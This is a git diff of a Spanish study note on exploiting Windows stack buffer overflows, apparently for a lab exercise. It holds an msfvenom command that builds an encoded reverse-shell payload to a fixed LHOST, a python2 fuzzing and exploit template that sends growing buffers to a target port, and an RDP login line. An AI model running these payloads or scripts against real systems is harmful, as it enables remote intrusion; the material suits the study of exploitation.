@@ -16,6 +16,13 @@ objdump -d -Mintel goodpwd.exe > goodpwd_disassembled.txt
 - memcpy
 - scanf/ fscanf
 
+## Conectarse a una maquina por RDP con xfreerdp 
+
+```shell
+xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea
+```
+
+
 ## Calculado el offset
 ### Paso 1 
 #### Generar un payload
@@ -103,7 +110,7 @@ Donde especificamos los badchar que no queremos que se incluya en el nuevo `byte
 ## Generar la shellcode
 ### Ejemplo de Shellcode
 ```shell
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.15 LPORT=4646 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai EXITFUNC=thread -f c
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.15 LPORT=4646 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai EXITFUNC=thread -f c --smallest
 ```
 Donde especificamos la aqrquitectura del sistema, los badchars que no queremos que se incluyan en el shellcode.
 ## Para escuchar el puerto podemos usar 
@@ -123,22 +130,21 @@ Lo cual nos dara como resultado el siguiente opcode
 ## Plantilla de exploit en python2
 ```python
 import socket
-import time
 
 host = "172.16.169.140"
 port = 9999
 
-junkbytes = "A"*524
-eip = "\xf3\x12\x17\x31"
-esp = "C"*700
-nops = "\x90"*20
-badchars = "\x00\x0A"
-shellcode = "\a0\x0d..."
+junkbytes = "A"*100
+# eip = "\xf3\x12\x17\x31"
+# esp = "C"*700
+# nops = "\x90"*20
+# badchars = "\x00\x0A"
+# shellcode = "\a0\x0d..."
 
 
-buffer = junkbytes + eip + nops + esp
+buffer = junkbytes # + eip + nops + esp
 
-while true:
+while True:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, port))
@@ -148,7 +154,7 @@ while true:
         print(message)
         print("[+] Payload sent with length: " + str(len(buffer)))
         s.close()
-        # junkbytes += ("A"*100)
+        buffer += ("A"*100)
     except Exception as ex:
         print "\n !!! Error en la conexion !!!\r\n" + str(ex)
         sys.exit(1)
